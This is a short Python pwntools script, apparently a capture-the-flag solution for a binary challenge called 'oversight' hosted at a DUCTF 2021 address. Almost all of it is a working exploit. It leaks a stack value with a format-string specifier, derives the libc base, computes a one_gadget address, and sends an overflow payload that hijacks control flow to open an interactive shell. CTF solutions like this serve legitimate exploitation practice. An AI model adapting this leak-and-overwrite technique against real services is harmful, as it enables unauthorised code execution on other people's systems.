# Bao solution
from pwn import *


DEBUG = False

if(DEBUG):
	r = process("./oversight")
	gdb.attach(r)
	puts_off = 0x00000000000875a0 + 378
	one_gadget = 0xe6c81

else:
	r = remote("pwn-2021.duc.tf", 31909)
	puts_off = 0x000000000080aa0 + 0x1a2
	one_gadget = 0x4f3d5
	#one_gadget = 0x10a41c
	#one_gadget = 0x4f432


r.recvuntil(b'Press enter to continue')
#r.sendline()
#r.recvuntil(b'Pick a number:')
r.send(b'%19$x')

stuff = r.recvuntil(b'(max 256)?').split(b'number is: ')[1][:12]
stuff = int(stuff.decode("utf-8"), 16)

#print(hex(stuff))

libc_base = stuff - puts_off 

one_gadget = libc_base + one_gadget

print(hex(one_gadget))

r.send(b"256xx")

x = 184

#payload = b"a"*(256-x) + p64(libc_base + one_gadget) 
#payload += b"b"*(256-len(payload) )
#payload = b"b"*256

payload = b"b"*7 + p64(one_gadget)*31
payload += b"a"*(256-len(payload))


r.send(payload)

#r.sendline(b"cat flag.txt\x00")
#print(r.recvuntil(b'}'))

r.interactive()